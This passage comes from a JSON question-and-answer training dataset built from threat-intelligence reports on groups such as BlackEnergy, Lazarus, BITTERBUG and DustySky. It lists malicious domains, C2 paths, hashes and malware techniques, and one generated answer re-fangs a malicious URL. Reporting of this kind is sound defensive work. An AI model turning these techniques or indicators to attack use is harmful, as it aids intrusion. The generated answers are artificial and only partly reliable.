b67a6f87fc3fd7c5c3666acac5918c8c08a53ab6a966f4d1daf38105a566ede1 b6abc8ab631dcf52e028ab26dbe3bb94022d69193c0acc8642cbd6329cbb23ef b7e117eb342b0d450095805073326989c792bf5ccbbdcd5f4a9ace50e517412e bb14abc9b0798c7756a6ed887308a3e6210cc08a5149dc1360fdd1f5bca27cca bdadb319f071f02462d107380102b669e407bb2a0b20e77a9a8a5726b4cbbc4b bf2383cfbee4cbb0bda2614839454ab1724c9bbfff8b4b48e0f48579ae220c10 bf52b44168de1855d83186163a2d5f29e488ddafdfd5447e211aec4a769cf74a c0d5cf7a0035deda5646aaf520b3ff632aa6be76ddbc88f38ddc11e77ffb40b4 c1a82a788df7418712664138c0fdb05232036a27ab0998479d60c656998849f1 c63a523834ab59ab5621a0acb156a9b901befe806044642fe5fec8a0ba545e70\nRead the text above and answer this question: How does the Gamaredon Group leverage commodity tools in their malware samples? What implications does this have for antimalware technologies?",
    "output": "The Gamaredon Group uses bundled commodity tools in their malware samples, which are listed by their respective hashes. This approach leverages legitimate applications and tools, such as wget, for malicious purposes. The heavy use of batch scripts and the modular nature of the malware contribute to its evasion of detection. Antimalware technologies have a poor record of detecting this malware, likely because the use of legitimate tools and scripts makes it harder for traditional signature-based detection methods to identify the malicious activity. This highlights the need for advanced behavioral analysis and heuristic detection mechanisms to counter such threats effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What methods does Gauss use to ensure persistence and avoid detection, and how does it interact with command-and-control servers?",
    "output": "Gauss ensures persistence by installing a set of modules that operate correctly when the malware starts. It uses a special registry key to store the configuration of modules, similar to Stuxnet/Duqu and Flame. The spy module on USB drives masks Trojan files without using a driver, avoiding system infection and extracting information using a 32- or 64-bit spy module. Gauss interacts with command-and-control servers to send collected information and download additional modules. The command servers went offline in mid-July 2012, during the investigation, indicating active management of the malware's infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: ATTACK OVERVIEW\nAt the time of writing, we have little information on how exactly victims are receiving the BlackEnergy malware being pushed by the Quedagh gang. An educated guess is that they are receiving the malware via targeted emails containing malicious attachments. Meanwhile, the following infection and technical details are based on samples gathered after searching through F-Secure Labs' collection of all BlackEnergy samples and identifying those with Quedagh characteristics.\nThe BlackEnergy toolkit comes with a builder application which is used to generate the clients that the attacker(s) use to infect victim machines. The toolkit also comes with server-side scripts, which the attackers set up in the command and control (C&C) server. The scripts also provide an interface where an attacker can control his bots. The simplicity and convenience provided by the toolkit means that anyone who has access to the kit can build his own botnet without any skills required.\nFigure 1: BlackEnergy Builder from 2007\nThe original BlackEnergy toolkit first emerged in 2007 and is referred to in this paper as BlackEnergy 1. A later variant of the toolkit (BlackEnergy 2) was released in 2010. We also encountered a previously unseen variant, which had been rewritten and uses a different format for its configuration. It also no longer uses a driver component. We dubbed this new variant BlackEnergy 3.\nBig Headline: INFECTION VECTORS\nMost of the recent BlackEnergy installers collected are named msiexec.exe. We believe they are either dropped by another executable that uses social engineering tricks to mislead the user into executing the installer, or by documents containing exploits that silently perform the installation.\nWe found at least 2 trojanized legitimate applications that execute the installer (in addition to their legitimate tasks). Trojanization is an effective infection method, as most users have no way of observing that a malicious component is being installed in tandem with a legitimate program.\nSome earlier installer variants, then named regedt32. exe, were distributed by documents exploiting software vulnerabilities, one of which was CVE-2010-3333. These documents drop and execute the installer, then open a decoy document. It is reasonable to assume that a similar approach has been used to deliver the more recent installer variants.\nThe installer filename of BlackEnergy 3 is still msiexec.exe. However, it is delivered and executed by a dropper which opens a decoy document in the foreground. We also encountered a standalone, non-persistent sample that pretends to be Adobe Flash Player Installer. It does not use any decoy document or application and does not run after reboot.\nThe overview below summarizes the various infection vectors used by the Quedagh gang to deliver BlackEnergy crimeware to the designated targets.\nBig Headline: TARGET DETAILS\nFrom the very earliest variants we were able to attribute to Quedagh, we have noticed that their targets have been political in nature. Apart from other indicators, we can deduce the nature of the target based on the content of social engineering tactics used to distribute the installers. For example, one decoy dropped from a sample dating to 2012 (image 2) seems to be targeting European audiences and discusses a political/economic situation. Strings found in another sample from 2012 (image 3) again indicate a political motivation behind the attack. Most decoys used content taken from news sites; we noted one decoy dropped by an exploit document was created using the Russian version of Office (image 4).\nThe latest variant of the dropper pretends to be a document file with a Ukrainian filename (image 5).  The choice of language for the filename again may tie  in or reference the current political crisis in that country. The filename itself means 'password list' in English.\nBig Headline: UKRAINE-RELATED PROXIES\nWhile examining the samples collected during our BlackEnergy monitoring, we noticed that samples from this year had been updated to support the use of proxy servers while connecting to their C&C servers. This contrasts with earlier BlackEnergy 2 variants, which do not support proxy servers. In some network setups, a proxy server is needed to allow internal users to access the Internet . BlackEnergy\u00b9s use of a proxy server may indicate that the gang has prior knowledge of the target organization's internal setup to note of this requirement.\nFor example, in one sample the configuration uses  the proxy server associated with the Ukrainian Railway (image 6). The configuration from another sample also shows it using an internal proxy under the giknpc domain (image 7). The domain giknpc.com.ua in turn hosts 3 domains (image 8), one of which is for the city of Dnipropetrovsk (image 9), the fourth-largest city in Ukraine, located in the southeast. Based on the set proxy servers for the different samples, we concluded that the gang is targeting Ukrainian government organizations.\nImage 2:\nDecoy document circa 2012\nImage 3:\nStrings from a sample circa 2012\nImage 4:\nDecoy document created using a Russian version of Office\nImage 5:\n2014 dropper sample disguised as a document. The filename means password list\nImage 6:\nConfiguration using Ukrainian Railway's proxy\nImage 7:\nConfiguration using internal proxy under giknpc domain\nAnswer this question: What are the key differences between the original BlackEnergy toolkit (BlackEnergy 1), its later variant (BlackEnergy 2), and the newly discovered variant (BlackEnergy 3)?",
    "output": "The original BlackEnergy toolkit, referred to as BlackEnergy 1, emerged in 2007. A later variant, BlackEnergy 2, was released in 2010. The newly discovered variant, dubbed BlackEnergy 3, has been rewritten and uses a different format for its configuration. Unlike its predecessors, BlackEnergy 3 no longer uses a driver component. Additionally, the installer filename for BlackEnergy 3 is still msiexec.exe, but it is delivered and executed by a dropper that opens a decoy document in the foreground.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Mitigations\nWe recommend that users conduct the following measures to detect and mitigate activity associated with TAG-38 activity:\n\u2022 Configure your intrusion detection systems (IDS), intrusion prevention systems (IPS), or any network defense mechanisms in place to alert on \u2014 and upon review, consider blocking connection attempts to and from \u2014 the external IP addresses and domains listed in the appendix.\n\u2022 Recorded Future proactively detects and logs malicious server configurations in the Command and Control Security Control Feed. The Command and Control list includes tools used by TAG-38 and Chinese state-sponsored threat activity groups, such as ShadowPad. Recorded Future clients should alert on and block these C2 servers to allow for detection and remediation of active intrusions.\n\u2022 Monitor for consistent anomalous outbound traffic from your network to unusual servers, such as compromised DVR/IP camera systems in this case, which may be indicative of malware beaconing activity.\n\u2022 Ensure software and firmware associated with IOT devices, such as DVR/IP camera systems, are kept up to date. Always change any default passwords to a strong, complex password and turn on two-factor authentication (2FA) if available. Where possible, avoid exposing these devices directly to the internet.\n\u2022 Recorded Future Threat Intelligence, Third-Party Intelligence, and SecOps Intelligence  users can monitor real-time output from network traffic analysis analytics to identify suspected targeted intrusion activity involving your organization or key vendors and partners.\nBig Headline: Outlook\nRecorded Future continues to track Chinese state-sponsored activity groups targeting a wide variety of sectors globally. A large majority of this conforms to longstanding cyber espionage efforts, such as targeting of foreign governments, surveillance of dissident and minority groups, and economic espionage. However, the coordinated effort to target Indian power grid assets in recent years is notably distinct from our perspective and, given the continued heightened tension and border disputes between the two countries, we believe is a cause for concern.\nBased on the complexity present across national critical infrastructure systems, this often necessitates lengthy reconnaissance operations to better understand the inner workings of these systems, both in a technological and a physical sense. This is reflected in publicly documented targeted intrusion activity targeting industrial control system (ICS) networks historically, which can often years. At this time, we have not identified evidence of compromise of ICS networks by TAG-38 operators from our visibility, although we cannot discount this possibility. Given the prolonged targeting of both SLDCs and RLDCs within India, first from RedEcho and now in this latest TAG-38 activity, we believe this targeting is a strategic priority for these actors and is likely to continue.\nBig Headline: Appendix A \u2014 Indicators\nReaders can access the indicators listed below in our public Insikt Group Github repository: (Continued Targeting of Indian Power Grid Assets by China State-sponsored Activity Group - March 2022).\nNote: We have observed a portion of the compromised infrastructure listed below indiscriminately scanning the internet outside of the First Seen/Last Seen dates associated with TAG-38 activity. Careful consideration should be given to these dates when analyzing any communications to these network indicators within your environment. The malicious activity described in this report consists of consistent long-term outbound network traffic to these nodes indicative of malware beaconing, not inbound scanning or brute forcing activity.\nMedium Headline: About Recorded Future\u00ae\nRecorded Future is the world's largest intelligence company. The Recorded Future Intelligence Platform provides the most complete coverage across adversaries, infrastructure, and targets. By combining persistent and pervasive automated data collection and analytics with human analysis, Recorded Future provides real-time visibility into the vast digital landscape and empowers clients to take proactive action to disrupt adversaries and keep their people, systems, and infrastructure safe. Headquartered in Boston with offices and employees around the world, Recorded Future works with more than 1,300 businesses and government organizations across 60 countries.\nLearn more at recordedfuture.com and follow us on Twitter at @RecordedFuture.\nRead the text above and answer this question: Why is it crucial to configure IDS and IPS systems to alert on and potentially block connections to external IP addresses and domains associated with TAG-38? What specific tool used by TAG-38 should be particularly monitored?",
    "output": "Configuring IDS and IPS systems to alert on and potentially block connections to external IP addresses and domains associated with TAG-38 is crucial because it helps in detecting and mitigating the activity of TAG-38. Specifically, monitoring for tools like ShadowPad, which is used by TAG-38 and other Chinese state-sponsored threat activity groups, is essential. Recorded Future's Command and Control Security Control Feed proactively detects and logs malicious server configurations, including those used by ShadowPad, allowing for the detection and remediation of active intrusions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: What Can Targeted Users Do?\nTools\nUse two\u00adfactor authentication. This feature is available on many popular email and social\nnetwork services including those from , , , , and others. Enabling two\u00adfactor authentication means you have to enter your password as well as a code provided by a text, app, or security key to access your account. The second factor helps protect you from credential theft.\nPassword Alert [] is a Chrome extension developed by Google that notifies you if you enter your Google credentials into any pages other than the real Google login page ().\nBehavior\nAlways be cautious about emails containing links or attachments and carefully examine the email sender address in suspicious messages.\nIf an email contains a link always verify that the domain in the URL matches the link text.\nFor further resources on digital security see Tibet Action Institute's project.\nBig Headline: Acknowledgements\nThis research was supported by the John D. and Catherine T. MacArthur Foundation (Professor Ronald J. Deibert, Principal Investigator). Special thanks to PassiveTotal, Ron Deibert, Lobsang Gyatso, Sarah McKune, Adam Senft, and Nart Villeneuve.\nAppendix A: Phishing Campaigns in Detail\nPhishing Attack 1\nThe first phishing attack we saw was sent on November 9, 2015 to a group of Tibetan journalists. The message purported to contain a link to a document with information on a controversial Buddhist sect known as , which has been involved in protests against the Dalai Lama.\nFrom: Choephel Tenzin <tenzinch128@gmail.com>\nDate: Mon, Nov 9, 2015\nSubject: Who is demonstrating against the Dalai Lama\nTo: [Redacted]\nFile regarding Dolgyal.\nWho is demonstrating against the Dalai Lama.doc\nThe link \"Who is demonstrating against the Dalai Lama.doc\" actually goes to http://accountgoogle[.]firewall\u2010gateway[.]com/servicclogin. When we first checked this link on November 13, the page was down and we therefore do not know what the original destination content was for this attack.\nMedium Headline: Destination Content Switch\nOn November 25 the link was active and the destination content was a public Google Drive folder that contained campaign materials on climate change from a Tibetan NGO. The climate change theme is significant, as during this period Tibetan organizations were taking part in advocacy to raise awareness on climate change in Tibetan areas in anticipation of the United Nations Conference on Climate Change held in Paris, France from November 30 to December 12, 2015.\nQuestion: What role did the 'Password Alert' Chrome extension play in protecting users from phishing attacks, and how did it function to alert users of potential threats?",
    "output": "Answer: The 'Password Alert' Chrome extension, developed by Google, played a crucial role in protecting users from phishing attacks by notifying them if they entered their Google credentials into any page other than the legitimate Google login page. This functionality helped users identify and avoid phishing attempts by alerting them to suspicious login prompts, thereby reducing the risk of credential theft.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 4.1 TTI Metric\nThe TTI score is calculated in two parts:\n(Social Engineering Sophistication Base Value) \u00d7(Technical Sophistication Multiplier)= TTI Score\nTTI scores range from 1 to 10, where 10 is the most sophisticated attack. Scores of 0 are reserved for threats that are not targeted, even if they are malicious. For example, spam using an attached PDF or XLS to bypass anti-spam filters, and highly sophisticated finan-cially motivated malware, would both score 0.\nThis section overviews how we compute the Social Engineering Sophistication Base Value (Section 4.2) and the Technical Sophistication Multiplier (Section 4.3). In Section 4.4, we present the results of computing and analyzing the TTI value of threats observed by the organizations in our study. We also discuss implications and limitations of the metric.\nMedium Headline: 4.2 Social Engineering Tactics\nWe leverage a manual coding approach to measure the sophistication of social engineering tactics used in the attacks observed by the organizations in our study. While automated approaches may be explored in the future, this manual analysis allows us to have high confidence in our results, especially since understanding the social engineering often required contextual information provided by the organizations in our study. To quantify the level of sophistication, we manually analyse the e-mail subject line, body, attachments and header fields. We perform an initial content analysis by coding the e-mails based on\ntheir semantic content, and then use these results to generate a numerical metric quantifying the level of targeting used.\nSmall Headline: 4.2.1 Content coding and analysis results\nWe code the e-mails based on their subject line, body, attachments and headers using the following methodology:\nSubject line, body, and attachments. The content of the subject line, body and attachments for each submitted e-mail were content coded into 8 themes, each containing categories for specific instances of the theme: Country / Region (referring to a specific geographical country or region); Ethnic Groups (referring to a specific ethnic group); Event (referring to a specific event); Organizations (referring to specific organizations); People (referring to specific persons), Political (reference to specific political issues), Technology (reference to technical support), Miscellaneous (content without clear context or categories that do not fall into one of the other themes). Table 3 summarizes the themes and provides examples of categories within each theme.\nE-mail headers. The header of each e-mail was analyzed to determine if the sending e-mail address was spoofed or the e-mail address was otherwise designed to appear to come from a real person and / or organization (e.g. by registering an e-mail account that resembles a person and / or organization's name from a free mail provider). We divide the results based on whether they attempted to spoof an organization or a specific person.\nUsing this manual analysis, we perform a content analysis of e-mails submitted by the organizations. Results of this analysis confirm that social engineering is an important tool in the arsenal of adversaries who aim to deliver targeted malware. Specifically, 95% and 97% of e-mails to Chinese and Tibetan groups, respectively, included reference to relevant regional issues. Spoofing of specific senders and organizations was also prevalent with 52% of e-mails to Tibetan groups designed to appear to come from real organizations, often from within the Tibetan community. For example, a common target of spoofing was the Central Tibetan Administration (CTA), referenced in 21% of the spoofed e-mails, which administers programs for Tibetan refugees living in India and advocates for human rights in Tibet. While the number of e-mail submissions were lower for the general human rights groups, we observe similar trends there with 92% of e-mails submitted by Rights Group 1 appearing to come from individuals in the group (as a result of spoofing).\nIn some cases we even observed the same attackers targeting multiple CSOs with customized e-mail lures. For example, we tracked a campaign that targeted China Groups 1 and 2, and Tibet Group 1 with a remote access\nTable 3: Overview of themes and categories within the themes for grouping targeted e-mail messages.\ntrojan we call IEXPL0RE [22] China Group 1 received the malware in e-mails claiming to be from personal friends whereas China Group 2 received the malware in an e-mail containing a story about a high-rise apartment building fire in China. In contrast, Tibet Group 1 received the malware embedded into a video of a speech by the Dalai Lama, attached to an e-mail about a year in review of Tibetan human rights issues.\nQuestion: How does the Targeted Threat Index (TTI) score incorporate both social engineering and technical sophistication, and why is it important to distinguish between targeted and non-targeted threats?",
    "output": "Answer: The TTI score is calculated by multiplying the Social Engineering Sophistication Base Value by the Technical Sophistication Multiplier. This score ranges from 1 to 10, with 10 being the most sophisticated attack. Scores of 0 are reserved for threats that are not targeted, even if they are malicious. For example, spam using an attached PDF or XLS to bypass anti-spam filters, and highly sophisticated financially motivated malware, would both score 0. Distinguishing between targeted and non-targeted threats is important because it helps in identifying and prioritizing the most severe and persistent threats that require specialized attention and defense mechanisms.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Metadata Analysis:\nAs mentioned earlier, during the email exchanged with Zubair Khan, he sent TCIRT a Microsoft Word document (.docx). In reviewing the document metadata for \"Response_ThreatConnect.docx \", TCIRT identified that it contained the creator properties of \"hp.\" TCIRT compared the metadata of two benign BITTERBUG-associated decoy documents from July 2013 and found that both also had the author of \"hp\" (Figure 10).\n39 http://www.know-hosting.com/view/27108-digitallinx.html\nWhile the author field of \"hp\" doesn't conclusively prove a relationship, it contributes to the body of circumstantial evidence which links properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with BITTERBUG targeting campaigns.\nMedium Headline: Malware Analysis:\nCyberSquared Inc. partnered with FireEye for a second technical review of the malware associated with this activity. FireEye analyzed the malware, which they call BITTERBUG, and determined it to be a custom backdoor. The backdoor relies on various support components, including the non-malicious, publically available Libcurl40 for installation, launch, and communications. In some variants, BITTERBUG has the ability to automatically target and exfiltrate files with extensions such as .doc, .xls, .pdf, .ppt, .egm, and .xml. The full malware report is included in Appendix A: Malware Details.\nThe earliest evidence of the malware family dates to April 2013, based on Portable Executable (PE) compile times, with more than 10 BITTERBUG variants observed to date. The earliest samples of BITTERBUG contain the \"Tranchulas\" debug path (below), as mentioned in the August 2013 TCIRT blog post. These BITTERBUG variants were probably used in attacks around summer 2013, using possible lures related to the then-recent death of \"Sarabjit Singh\" (an Indian national imprisoned in Pakistan) and an Indian Government pension memorandum. As stated in the original blog (and raised in the formal Tranchulas response), several binaries contain references to \"Cath\" in the debug path. It is important to note that the \"Cath\" files are support components and not BITTERBUG variants, so it is probable that these were developed by another party but are a required component of the family.\nC:\\Users\\Tranchulas\\Documents\\Visual Studio 2008\\Projects\\upload\\Release\\upload.pdb C:\\Users\\Cath\\documents\\visual studio 2010\\Projects\\ExtractPDF\\Release\\ExtractPDF.pdb C:\\Users\\Cath\\documents\\visual studio 2010\\Projects\\Start\\Release\\Start.pdb\nAdditional BITTERBUG variants were compiled in June and July 2013 that contained different identifiers in the debug paths: \"Cert-India\" (3 samples) and \"umairaziz27\" (1 sample).41 The presence of \"umairaziz27\" in a debug path from one sample makes us wonder if this represents an operational security mistake. The debug path of \"umairaziz27\" led us to Twitter42 and LinkedIn43 accounts (on which a matching alias is used) that belong to a Tranchulas employee named Umair Aziz, who identified himself as an Information Security Analyst44 and graduate of National University of Sciences and Technology45 (NUST).46 One of these samples was probably used in attacks in late summer 2013, using a \"leaked report\" lure which contained a decoy document related to Pakistan's alleged inability to locate Osama Bin Laden.\nC:\\Users\\Cert-India\\Documents\\Visual Studio 2008\\Projects\\ufile\\Release\\ufile.pdb C:\\Users\\umairaziz27\\Documents\\Visual Studio 2008\\Projects\\usb\\Release\\usb.pdb\nAfter publication of the TCIRT blog and our communications with Tranchulas occurred in August 2013, no new samples of BITTERBUG or its support components (based on compile times) were identified until September (various support components) and October (a new BITTERBUG variant). Interestingly, the samples compiled following the blog publication used entirely new and generic debug paths (Figure 11) as well as a compilation tactic to conceal the C2 address from static analysis. Between September and December, we observed more variations of BITTERBUG and its support components in terms of packaging, host-based activities,\n40 http://curl.haxx.se/libcurl/\n41 Appendix A: Malware Details\n42 https://twitter.com/umairaziz27\n43 http://pk.linkedin.com/in/umairaziz27\n44 https://twitter.com/umairaziz27/status/332049978878996481\n45 www.nust.edu.pk\n46 http://www.nust.edu.pk/INSTITUTIONS/Directortes/ilo/Download%20Section/Graduate%20Profile%20SEECS%20%20BICSE.pdf\nand decoys (or the lack of them) compared to the samples before our blog post. This could indicate that the threat actors were aware of the blog post and modified their malware and related components to distance them from prior indicators.\nQ: How does the metadata analysis of the 'Response_ThreatConnect.docx' document contribute to linking the Tranchulas response to BITTERBUG targeting campaigns? Explain the significance of the 'hp' author field in this context.",
    "output": "The metadata analysis of the 'Response_ThreatConnect.docx' document revealed that it contained the creator properties of 'hp'. This is significant because when TCIRT compared the metadata of two benign BITTERBUG-associated decoy documents from July 2013, they found that both also had the author of 'hp'. While the author field of 'hp' doesn't conclusively prove a relationship, it contributes to the body of circumstantial evidence which links properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with BITTERBUG targeting campaigns. This suggests a potential connection between the creators of the Tranchulas response and the BITTERBUG operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Second Malicious Document used in the campaign\nMalicious Document \u2013 Salary_Lockheed_Martin_job_opportunities_confidential.doc (0160375e19e606d06f672be6e43f70fa70093d2a30031affd2929a5c446d07c1)\nThe initial attack vector used in this document is similar to the first document but the malware dropped by the macro is totally different. Sadly, the C2 for this malware was down by the time we started analyzing it.\nThis document uses KernelCallbackTable as well to hijack the control flow just like our first module, the injection technique used by the shellcode also resembles the first document. The major difference in this document is that it tries to retrieve a remote HTML page and then executes it using mshta.exe. The remote HTML page is located at https[:]//markettrendingcenter[.]com/member.htm and throws a 404 Not Found which makes it difficult for us to analyze this document any further.\nBig Headline: Attribution\nThere are multiple indicators that suggest that this campaign has been operated by the Lazarus threat actor. In this section we provide some of the indicators that confirm the actor behind this attack is Lazarus:\nUsing job opportunities as template is the known method used by Lazarus to target its victims. The documents created by this actor are well designed and contain a large icon for a known company such as LockHeed Martin, BAE Systems, Boeing and Northrop Grumman in the template.\nIn this campaign the actor has targeted people that are looking for job opportunities at Lockheed Martin. Targeting the defense industry and specifically Lockheed Martin is a known target for this actor.\nThe document's metadata used in this campaign links them to several other documents used by this actor in the past.\nUsing Frame1_Layout for macro execution and using lesser known API calls for shellcode execution is known to be used by .\nWe also were able to find infrastructure overlap between this campaign and past campaigns of Lazarus (Figure 19).\n\nQuestion: How does the second malicious document used in the Lazarus APT campaign differ from the first in terms of payload delivery, and what specific techniques does it employ to execute the malicious payload?\n\nAnswer:",
    "output": "The second malicious document used in the Lazarus APT campaign differs from the first in that the malware dropped by the macro is entirely different. While both documents use KernelCallbackTable to hijack the control flow and employ similar injection techniques, the second document attempts to retrieve a remote HTML page and then executes it using mshta.exe. This HTML page is hosted at 'https://markettrendingcenter.com/member.htm', but it returns a 404 Not Found error, making further analysis challenging.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: SSL and digital certificates\nRecently, command and control communication changed from HTTP to HTTPS. The digital certificate used in the HTTPS traffic is either self-signed or uses a legitimate Comodo issued certificate.\nThe domain bulk-smtp[.]xyz, which is owned by the attackers, uses the following digital certificate:\nCertificate:\nData:\nVersion: 3 (0x2)\nSerial Number:\n35:e5:39:4c:58:e8:4d:f5:fa:9a:3c:25:21:12:01:19\nSignature Algorithm: sha256WithRSAEncryption\nPrior to using the Comodo issued certificate, the attackers used a self-signed certificate, impersonating a Tel-Aviv, Israel based company called EMS. The organizational unity in the certificate is \"Email Markting Sales\" (note the misspelling of \"marketing\").\nCertificate:\nData:\nVersion: 3 (0x2)\nSerial Number: 13229300438499639338 (0xb797eaa82fb0c02a)\nSignature Algorithm: sha256WithRSAEncryption\nIssuer: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml Validity Not Before: Nov 17 14:15:08 2015 GMT Not After : Nov 16 14:15:08 2016 GMT\nSubject: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email\nMarkting Sales, CN=email-market.ml/emailAddress=info@email-market.ml\nFor another domain, smtp.gq, this self-signed certificate was used:\nCertificate:\nData:\nVersion: 1 (0x0)\nSerial Number: 12074485766838107425 (0xa79130d4e1e53d21)\nSignature Algorithm: sha1WithRSAEncryption\nIssuer: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co., CN=smtp.gq /emailAddress=info@smtp.gq\nValidity\nNot Before: Nov 17 14:48:51 2015 GMT\nNot After : Dec 17 14:48:51 2015 GMT\nSubject: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co.,\nCN=smtp.gq /emailAddress=info@smtp.gq\nDustySky communication uses some or all of the following paths when communicating with its command and control server:\nUpdate.php\nconn.php\ngeoiploc.php\nnews.htm\npass.php\npassho.php\npassyah.php\nMedium Headline: Infrastructure\nUsing PassiveTotal's attack analysis platform, we were able to visualize the last 6 months of data for key infrastructure used by the actors. It's worth noting that all IP addresses have been active in the past several weeks with many of the domains resolving to them being a combination (green squares) of dynamic DNS providers (blue squares) and registered domains (brown squares). These heatmaps allow us to identify interesting periods or changes in the infrastructure that may have been due to actors adjusting their tactics.\nReader:\nIn this graph, we can see the actors used a combination of dynamic DNS and registered domains up until December 23rd. On that day, the actors seem to remove the registered domain and strictly use dynamic DNS. It's unclear why this would occur, but it's possible that the server changed functions in the attack or was no longer needed.\nMedium Headline: 192.52.167.235\nIn this graph, the colors clearly segment activity that occurred. The primary period of interest appears to be when both dynamic DNS and registered domains are in use. This occurs from September 23rd to December 17th and has a number of days where new domains are associated to the IP address. While not entirely known, this period could reflect the actors going live in their operation. Based on emails sent and compilation dates, there were plenty of phishing campaigns going on during this period of time. It's also worth noting that this IP address is no longer showing any content which could mean it's been taken offline.\nMedium Headline: 45.32.13.169\nIn this graph, the gray blocks indicate that no activity was captured for a majority of the time. Starting November 9th, the actors introduced four unique, registered domains before then adding dynamic DNS providers. What's most interesting about this IP address is that the content for both dynamic DNS urls and registered domains lead to the same download page that hosts a Windows executable. It's unclear why the attackers continue to use both, but the move from registered domains to also using dynamic DNS domains could suggest the actors are beginning to wise up. The use of dynamic DNS infrastructure makes attribution and tracking more difficult as a dynamic DNS domain could be shared by unrelated parties.\nMedium Headline: Gaza Strip origins\nOnly one sample \u2013 aa288a5cbf4c897ff02238e851875660 \u2013 was uploaded to VirusTotal, shortly after it was compiled. Less than a minute and a half elapsed between compilation on August 8th 2015 at 10:31:12 and the first VirusTotal submission at 10:32:24. This sample was uploaded from Gaza.\nThe very short time frame between compilation and VirusTotal submission could indicate that the attacker is the one who has submitted the sample \u2013 in order to learn whether antivirus engines detect it.\n1\n1\n14 All attribution data in the table are taken from .\nMedium Headline: Individuals\nRecent samples had \"Last Saved By\" properties of the document point to a specific individual who we believe is one of the attackers. In his Social media accounts this individual defines himself as a Software Engineer who lives in Gaza. Public interactions on his YouTube page (such as videos he liked) are related to hacking tools and methods. We have decided not to disclose this individual's name in the public report.\n1\n1\n17 CITYNET \u2014 City Net Informatics, Internet and Communication Technologies and General Trade Ltd. (PS)\nBig Headline: Appendix A - Malicious email messages and lures\nBelow we present email and lure documents that were used in the campaign.\nSaudi Arabia boosts security on Yemen border\nGreek coastguard appears to sink refugee boat.exe\nUS delegation heading to Israel to discuss Iran terror funding eea2e86f06400f29a2eb0c40b5fc89a6\nSupermodel Bar Refaeli Stars in Israeli Spy Movie.exe\nISIS leader raped the American captive\nThe Truth About Your Sexual Peak , Don't worry\n\u0628\u0633\u0623\u0627\u0628 \u0641\u0631 \u0639 \u0627\u0635\u062d\u0644\u0646\u0627\u0629 \u0627\u0644\u062f\u0628\u0644\u0648\u0645\u064a\u0633\u0627\u0629 \u0646\u0639 \u0627\u0633\u0644\u064a\u0633\u064a \u062a\u062d\u0627\u0648\u0645\u0627\u0644 \u0639\u0627\u0642\u062a\u0627\u0647\u0644 \u0641 \u064a \u0646\u0644\u062f\u0646\n.exe\n(the reasons for lifting A-Sisi's diplomatic immunity and the possibility of his arrest in London)\nGoogle-Privacy.doc\nInvoice details.doc\nf94dfd49142bdae4a525997e4c0b944c\n\u0628\u0623\u0632\u0631 \u0645\u0627 \u062e\u064a \u0635 \u0635\u0645 \u0631 \u064a\u0641 \u062a \u064a\u0631\u0633\u0628\u0627\u062a \u0627\u062e\u0644\u0631\u0627\u0629\u064a\u062c \u0627\u0639\u0633\u0644\u0648\u064a\u062f\u0629\n(Highlights of matters attributed by Egypt to the leaks from the Saudi foreign service)\n\u0627\u062a\u0645\u0644\u0647\u0645 \u0627 \u0644\u062d\u0642\u064a\u0642\u064a \u064a\u0641 \u0631\u0638\u0646 \u0631 \u064a\u0633\u0648\u0627 \u0628 \u0629\u064a\u0636\u0642 \u0627\u0637\u0644\u0626\u0627\u0631\u0629 \u0627 \u062a\u0644\u064a \u0623 \u0637\u0642\u0633\u062a \u064a\u0641 \u0646\u064a\u0633 \u0621\u0627\n(Translation: \"the real culprit behind the plane crash in Sinai, according to Russia\")\n\u05e8\u05d0\u05d4\n\u05d1 \u05d7\u05e4\u05e9\u05d5\u05ea \u05d5\u05e1\u05d5\u05d3\u05ea \u05d4\u05d0\u05d8\u05dd\u05d5 \u05e9 \u05dc \u05d9\u05e8\u05e9\u05d0\u05dc\n\"\n18\n(The USA reveals Israel's nuclear secrets)\n\u05ea\u05d0\n. preposition accusative the ofomission\u2013error  syntax  a includes titleThe18\n\u00a9 Clearsky - Cyber security.\nSpy vs. Spy: Inside the Fraying U.S.-Israel Ties.exe\n\u05d4\u05e9\u05de\u05d8\u05e8\u05d4 \u05d5\u05d1\u05d3\u05ea\u05e7 \u05e9\u05d7\u05d3 \u05de\u05dc\u05e1\u05ea\u05e8\u05d9 \u05de\u05de\u05e1\u05d9\u05db\u05dd \u05d9\u05d9\u05d3\u05d5\u05e1\u05dd\n\nHow does the short time frame between the compilation of a malware sample and its submission to VirusTotal indicate the actions of the attacker? What preventive measures can be taken based on this observation?",
    "output": "The short time frame between the compilation of a malware sample and its submission to VirusTotal indicates that the attacker likely submitted the sample themselves to check if it is detected by antivirus engines. This behavior suggests that the attacker is testing the effectiveness of their malware. Preventive measures based on this observation include monitoring VirusTotal submissions for newly compiled samples, especially those originating from regions associated with the attackers, such as Gaza. Early detection and analysis of these samples can help in proactively updating antivirus signatures and improving overall security posture.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
